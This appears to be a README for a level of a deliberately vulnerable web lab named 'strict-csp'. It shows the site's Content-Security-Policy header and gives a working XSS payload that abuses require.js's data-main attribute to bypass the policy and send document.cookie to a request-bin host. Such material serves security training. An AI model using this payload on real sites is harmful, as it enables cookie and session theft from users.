# strict-csp

Same as [csp](../csp/README.md), name and comment are vulnerable to XSS.

The CSP header is:

```http
Content-Security-Policy
    default-src 'self'; script-src 'strict-dynamic' 'nonce-EBZ5Jp7Kqi'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none'

Referrer Policy: strict-origin-when-cross-origin
```

With `<script data-main='data:1,"use strict"%0d%0awindow.location.href="some.request.bin.site?cookie="+document.cookie' src='require.js'></script>` we can bypass the CSP.
